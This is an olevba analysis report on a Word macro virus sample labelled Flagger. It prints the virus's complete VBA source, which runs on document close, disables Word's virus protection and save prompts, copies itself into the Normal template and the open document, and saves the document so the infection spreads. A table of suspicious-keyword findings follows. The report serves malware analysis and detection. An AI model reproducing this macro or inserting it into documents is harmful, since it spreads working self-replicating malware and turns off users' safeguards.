olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Flagger-b02ea6f66851e54c27d529b62447aa6388f8b3c0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Flagger-b02ea6f66851e54c27d529b62447aa6388f8b3c0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
' íû÷êà, à âîò è íå íàéä¸òå -:)
On Error Resume Next
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
' ñàìàõîäíûé ìåõàíèçì
Set VT = MacroContainer.VBProject.VBComponents.Item(1)
Set ND = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
VTL = VT.CodeModule.CountOfLines
If ND.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
For i = 1 To VTL
ND.CodeModule.InsertLines i, VT.CodeModule.Lines(i, 1)
Next i
End If
NDL = ND.CodeModule.CountOfLines
ADL = AD.CodeModule.CountOfLines
SFlag = ActiveDocument.Saved
If AD.CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
For i = 1 To NDL
AD.CodeModule.InsertLines i, ND.CodeModule.Lines(i, 1)
Next i
End If
If (Left(ActiveDocument.Name, 8) <> "Document") And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
ActiveDocument.Saved = SFlag
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

